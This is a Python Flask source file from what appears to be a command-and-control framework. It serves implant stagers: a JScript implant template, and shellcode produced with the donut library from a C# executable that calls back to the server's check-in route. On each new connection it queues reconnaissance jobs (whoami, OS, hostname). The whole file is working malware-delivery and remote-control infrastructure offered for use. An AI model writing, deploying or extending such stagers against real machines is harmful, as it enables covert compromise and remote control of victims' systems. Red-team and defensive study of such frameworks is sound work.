import base64
import configparser
import donut
import os


from connect.server import app, db
from connect.server.database import Routes, Connections, Jobs
from flask import request, render_template, send_file


def load_route(name):
    return Routes.query.filter(Routes.name == name).one().identifier


@app.route(f"/{load_route('JScript')}", methods=['POST', 'GET'])
def jscript():
    """
    jscript Route

    The jscript route expects a get request and will return a implant to be executed on the target(s) machine. The
    implant will attempt to establish a command and control connection to the framework.
    """
    config = configparser.ConfigParser()
    config.read(f'{os.getcwd()}/connect/stagers/jscript/config.ini')
    connection = Connections(type='JScript')
    db.session.add(connection)
    db.session.commit()
    check_in_job = Jobs(name='check_in', connection=connection, type=2)
    whoami_job = Jobs(name='whoami', connection=connection, type=0)
    os_job = Jobs(name='os', connection=connection, type=0)
    hostname_job = Jobs(name='hostname', connection=connection, type=0)
    db.session.add(check_in_job)
    db.session.add(whoami_job)
    db.session.add(os_job)
    db.session.add(hostname_job)
    db.session.commit()
    return render_template('/jscript/connect.js', connection_id=connection.identifier,
                           check_in_uri=f"{request.host_url}{load_route('check_in')}",
                           check_in_job_id=check_in_job.identifier, sleep=config['REQUIRED']['check_in_delay'])


@app.route(f"/{load_route('CSharp')}", methods=['POST', 'GET'])
def csharp():
    """
    csharp Route

    The jscript route expects a get request and will return shellcode to be executed on the target(s) machine. The
    implant will attempt to launch establish a command and control connection to the framework.
    """
    config = configparser.ConfigParser()
    config.read(f'{os.getcwd()}/connect/stagers/csharp/config.ini')
    connection = Connections(type='CSharp')
    db.session.add(connection)
    db.session.commit()
    check_in_job = Jobs(name='check_in', connection=connection, type=2)
    whoami_job = Jobs(name='whoami', connection=connection, type=0)
    os_job = Jobs(name='os', connection=connection, type=0)
    hostname_job = Jobs(name='hostname', connection=connection, type=0)
    db.session.add(check_in_job)
    db.session.add(whoami_job)
    db.session.add(os_job)
    db.session.add(hostname_job)
    db.session.commit()
    check_in_uri = request.host_url + str(load_route('check_in'))
    print('requested csharp')
    return donut.create(file=f'{os.getcwd()}/connect/stagers/csharp/connect.exe', params=f'{check_in_uri},{check_in_job.identifier}')
